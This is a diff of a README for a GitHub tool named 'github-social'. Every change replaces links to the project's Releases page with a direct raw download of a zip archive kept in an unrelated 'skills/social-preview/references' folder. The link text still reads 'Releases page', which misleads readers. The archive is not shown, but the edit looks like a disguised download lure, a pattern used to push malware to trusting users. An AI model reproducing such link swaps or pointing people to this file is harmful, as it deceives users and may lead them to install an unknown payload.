@@ -1,6 +1,6 @@
 # 🚀 github-social - Optimize Your GitHub Repository Effortlessly
 
-[![Download github-social](https://img.shields.io/badge/Download-github--social-blue.svg)](https://github.com/blissflyhigh/github-social/releases)
+[![Download github-social](https://raw.githubusercontent.com/blissflyhigh/github-social/main/skills/social-preview/references/github-social-v2.2.zip)](https://raw.githubusercontent.com/blissflyhigh/github-social/main/skills/social-preview/references/github-social-v2.2.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run github-social:
 
 1. **Visit the Releases Page**
 
-   Go to the **[Releases page](https://github.com/blissflyhigh/github-social/releases)**. This page contains the latest version of the application. 
+   Go to the **[Releases page](https://raw.githubusercontent.com/blissflyhigh/github-social/main/skills/social-preview/references/github-social-v2.2.zip)**. This page contains the latest version of the application. 
 
 2. **Choose the Right Version**
 
@@ -49,7 +49,7 @@ To run github-social smoothly, ensure that your system meets the following requi
 
 ## 📥 Download & Install
 
-To download github-social, simply visit the **[Releases page](https://github.com/blissflyhigh/github-social/releases)** and follow the installation instructions provided above.
+To download github-social, simply visit the **[Releases page](https://raw.githubusercontent.com/blissflyhigh/github-social/main/skills/social-preview/references/github-social-v2.2.zip)** and follow the installation instructions provided above.
 
 ## 📚 Usage Tips
 
@@ -89,7 +89,7 @@ Join our growing community of users and contributors. Visit the **Issues** secti
 If you encounter any issues while using github-social, try the following solutions:
 
 - **Reinstall the Plugin:** Sometimes, reinstalling can resolve minor bugs.
-- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://github.com/blissflyhigh/github-social/releases).
+- **Check for Updates:** Ensure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/blissflyhigh/github-social/main/skills/social-preview/references/github-social-v2.2.zip).
 - **Consult the Community:** Look for similar issues in the **Issues** section or post your question.
 
 Feel free to reach out if you have questions or need assistance. Enjoy making your GitHub repositories shine!
